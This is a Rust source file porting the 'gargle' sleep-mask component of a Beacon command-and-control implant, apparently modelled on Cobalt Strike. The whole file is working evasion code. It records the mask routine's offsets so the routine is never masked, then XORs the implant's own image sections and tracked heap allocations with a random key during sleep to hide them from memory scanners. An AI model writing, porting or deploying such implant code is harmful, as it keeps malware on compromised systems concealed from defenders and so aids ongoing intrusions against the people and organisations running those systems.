//! Port of gargleint.cpp — the shared gargle (sleep mask) parameter block and
//! trampoline setup.
//!
//! The C++ build copies a raw asm trampoline (`_gargle_it`) into an executable
//! heap region, records its address in `gtrampoline`, allocates a `GARGLEP`
//! parameter block (`gparms`) and fills the `-1` placeholders that the team
//! server left in the `SETTING_GARGLE_SECTIONS` table with the trampoline's
//! begin/end offsets so the mask loop never masks its own code.
//!
//! The Rust port does the same *data* work but never executes a copied
//! trampoline: `gargle_trampoline` records the (Rust) mask function addresses
//! and patches the section table exactly like the C++, and the masking itself
//! is a plain XOR applied to the same memory ranges (see
//! [`mask_sections_and_heap`]). The `-1` placeholders become a *reversed* pair
//! `(end, begin)`; [`mask_sections_and_heap`] skips reversed pairs, which is
//! how the trampoline region stays untouched.

use crate::track_memory::{track_memory_add, HeapRecord, TRACK_MEMORY_MALLOC};
use parking_lot::Mutex;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::OnceLock;

/// Size of the XOR mask (gargleint.h `MASK_SIZE`).
pub const MASK_SIZE: usize = 13;

/// GARGLEP — the gargle parameter block (gargleint.h).
///
/// `sections` points at the (patched) `SETTING_GARGLE_SECTIONS` DWORD array:
/// `[begin, end]` pairs of offsets relative to `beacon_ptr`, terminated by
/// `(0, 0)`. `heap_records` mirrors the C++ pointer (the current heap records
/// to mask); the records themselves live in [`CURRENT_HEAP`].
#[repr(C)]
pub struct GargleP {
    /// Pointer to our base Beacon section (image base).
    pub beacon_ptr: *mut u8,
    /// The sections we want to mask (offsets from `beacon_ptr`).
    pub sections: *mut u8,
    /// The heap memory we want to mask (mirrors the C++ `HEAP_RECORD` list).
    pub heap_records: *mut u8,
    /// The mask we want to apply.
    pub mask: [u8; MASK_SIZE],
}

// The pointers are stable process-global addresses (image base, patched
// settings blob, heap-record list); the mutex serializes access, so the
// struct is safe to share. Mirrors the C++ global `gparms`.
unsafe impl Send for GargleP {}

impl GargleP {
    const fn empty() -> GargleP {
        GargleP {
            beacon_ptr: std::ptr::null_mut(),
            sections: std::ptr::null_mut(),
            heap_records: std::ptr::null_mut(),
            mask: [0u8; MASK_SIZE],
        }
    }
}

/// `gtrampoline` — address of the sleep mask function, or 0 before setup.
pub static GTRAMPOLINE: AtomicUsize = AtomicUsize::new(0);

/// `gparms` — the process-lifetime gargle parameter block. The C++ mallocs it
/// once and never frees it; a `parking_lot::Mutex<GargleP>` static is the Rust
/// equivalent (stable address, no allocation, no leak).
static GPARMS: Mutex<GargleP> = Mutex::new(GargleP::empty());

/// Patched copy of the `SETTING_GARGLE_SECTIONS` blob (see [`gargle_trampoline`]).
/// Stored for the process lifetime so `sections` stays valid, mirroring the
/// C++ in-place patch of the myargs blob.
static SECTION_BLOB: OnceLock<Vec<u8>> = OnceLock::new();

/// The current heap records to mask, refreshed before every sleep/wait so new
/// allocations are covered (the C++ resets `gparms->heap_records` for each
/// sleep via `track_memory_get_heap_records_to_mask`).
static CURRENT_HEAP: Mutex<Vec<HeapRecord>> = Mutex::new(Vec::new());

/// Locked access to the global gargle parameter block.
pub fn gparms() -> parking_lot::MutexGuard<'static, GargleP> {
    GPARMS.lock()
}

/// Refresh the heap records that gargle masks. Called before every masked
/// sleep/wait so items added since the last sleep are covered. Mirrors
/// `gparms->heap_records = track_memory_get_heap_records_to_mask()`.
pub fn refresh_heap_records() {
    let recs = crate::track_memory::track_memory_get_heap_records_to_mask();
    let ptr;
    {
        let mut current = CURRENT_HEAP.lock();
        *current = recs;
        ptr = if current.is_empty() {
            std::ptr::null_mut()
        } else {
            current.as_ptr() as *mut u8
        };
    }
    /* never hold CURRENT_HEAP while taking GPARMS (masking takes the reverse order) */
    GPARMS.lock().heap_records = ptr;
}

/// `gargle_trampoline` — set up the trampoline and the gargle parameter block.
///
/// Faithful port of gargleint.cpp:
/// 1. Returns immediately if the trampoline was already set up.
/// 2. Records `begin` as the trampoline address.
/// 3. Allocates the `GARGLEP`, tracks it (mask = FALSE), and fills
///    `beacon_ptr` / `sections` / `heap_records`.
/// 4. Replaces the `-1` placeholders in the sections table with the
///    trampoline end/begin offsets (relative to `beacon_ptr`).
/// 5. Fills the random mask (`rng_get_bytes` → `getrandom`).
///
/// In the C++ build the trampoline bytes were copied and executed from a heap
/// region; in the Rust port the mask function is ordinary Rust code and only
/// its *address* is recorded (used for the placeholder offsets).
pub fn gargle_trampoline(end: *mut u8, begin: *mut u8) {
    if GTRAMPOLINE.load(Ordering::SeqCst) != 0 {
        return;
    }

    /* calculate the size of our function */
    let _dw_function_size = (end as usize).wrapping_sub(begin as usize);

    /* set trampoline to the start of the sleep mask function */
    GTRAMPOLINE.store(begin as usize, Ordering::SeqCst);

    /* setup our parameters, please */
    let mut gp = GargleP {
        beacon_ptr: crate::settings::get_beacon_ptr() as *mut u8,
        sections: std::ptr::null_mut(),
        heap_records: std::ptr::null_mut(), /* this is reset for each sleep. */
        mask: [0u8; MASK_SIZE],
    };

    /* update place holder addresses in the sections, so the sleep mask
     * function will not be masked. The C++ patches the myargs blob in place;
     * we patch a process-lifetime copy instead (same data, no aliasing
     * through an immutable setting slice). */
    if let Some(sections) = crate::settings::setting_ptr(crate::beacon::SETTING_GARGLE_SECTIONS) {
        let mut blob = sections.to_vec();
        patch_placeholders(&mut blob, end, begin, gp.beacon_ptr as usize);
        let ptr = blob.as_ptr() as *mut u8;
        let _ = SECTION_BLOB.set(blob);
        gp.sections = ptr;
    }

    /* random mask: rng_get_bytes(mask, sizeof(mask), NULL) */
    let _ = getrandom::fill(&mut gp.mask);

    /* track the parameter block exactly like the C++ malloc + track_memory_add */
    let gp_addr = std::ptr::addr_of!(*GPARMS.lock()) as usize;
    track_memory_add(
        gp_addr,
        std::mem::size_of::<GargleP>(),
        TRACK_MEMORY_MALLOC,
        false,
        None,
    );

    *GPARMS.lock() = gp;
}

/// Replace `-1` (`0xFFFFFFFF`) placeholders in the sections DWORD array.
///
/// Per gargleint.cpp: the first slot of a pair is replaced with the trampoline
/// *end* offset, the second with the trampoline *begin* offset. The pair then
/// reads as `(end, begin)` — reversed relative to a real `(begin, end)` range,
/// which is how [`mask_sections_and_heap`] recognises and skips it.
fn patch_placeholders(sections: &mut [u8], end: *mut u8, begin: *mut u8, beacon_ptr: usize) {
    let words = sections.len() / 4;
    if words < 2 {
        return;
    }
    let dwords: &mut [u32] =
        unsafe { std::slice::from_raw_parts_mut(sections.as_mut_ptr() as *mut u32, words) };
    let mut index = 0usize;
    while index + 1 < words {
        let a = dwords[index];
        let b = dwords[index + 1];
        if a == 0 && b == 0 {
            break;
        }
        if a == u32::MAX {
            /* Replace this with the sleep mask function end location */
            dwords[index] = (end as usize).wrapping_sub(beacon_ptr) as u32;
        }
        if b == u32::MAX {
            /* Replace this with the sleep mask function begin location */
            dwords[index + 1] = (begin as usize).wrapping_sub(beacon_ptr) as u32;
        }
        index += 2; /* goto the next section */
    }
}

/// XOR `len` bytes at `ptr` with the 13-byte mask, DWORD at a time.
///
/// Faithful to the C++ `((DWORD *)addr)[i] ^= mask[i % sizeof(mask)]` where
/// `mask` is a signed `char`: each DWORD is XORed with the sign-extended mask
/// byte, so only the low byte changes for mask values < 0x80 and all four
/// bytes change for values >= 0x80. XOR is its own inverse, so applying the
/// same mask twice restores the original bytes.
///
/// # Safety
/// `ptr` must point to `len` readable/writable bytes aligned for `u32`
/// (section offsets are DWORD-aligned; heap records come from the allocator).
pub(crate) unsafe fn mask_region(ptr: *mut u8, len: usize, mask: &[u8; MASK_SIZE]) {
    if ptr.is_null() {
        return;
    }
    let words = len / 4;
    for i in 0..words {
        let d = ptr.add(i * 4) as *mut u32;
        *d ^= (mask[i % MASK_SIZE] as i8) as u32;
    }
}

/// Mask the tracked heap records and the configured beacon sections.
///
/// Mirrors the masking half of the C++ `_gargle_it` loop:
/// - heap: every record from `track_memory_get_heap_records_to_mask()`
/// - sections: `[begin, end]` pairs of offsets from `beacon_ptr`; reversed
///   pairs (the trampoline region, encoded as `(end, begin)` by
///   [`gargle_trampoline`]) are skipped so the mask function is never masked.
pub(crate) fn mask_sections_and_heap(parms: &GargleP) {
    /* mask our heap sections */
    let recs = CURRENT_HEAP.lock();
    for rec in recs.iter() {
        if rec.size == 0 {
            continue;
        }
        unsafe { mask_region(rec.ptr as *mut u8, rec.size, &parms.mask) };
    }
    drop(recs);

    /* mask our sections */
    if parms.sections.is_null() {
        return;
    }
    let sections = parms.sections as *const u32;
    let mut index = 0usize;
    loop {
        let a = unsafe { *sections.add(index) };
        let b = unsafe { *sections.add(index + 1) };
        if a == 0 && b == 0 {
            break;
        }
        /* skip reversed (trampoline) ranges */
        if a < b {
            let base = parms.beacon_ptr as usize;
            unsafe { mask_region((base + a as usize) as *mut u8, (b - a) as usize, &parms.mask) };
        }
        index += 2;
    }
}

/// Unmask the tracked heap records and beacon sections.
///
/// The C++ toggles the mask on and off in 100 ms slices; since XOR is its own
/// inverse, unmasking applies the same XOR a second time.
pub(crate) fn unmask_sections_and_heap(parms: &GargleP) {
    mask_sections_and_heap(parms);
}
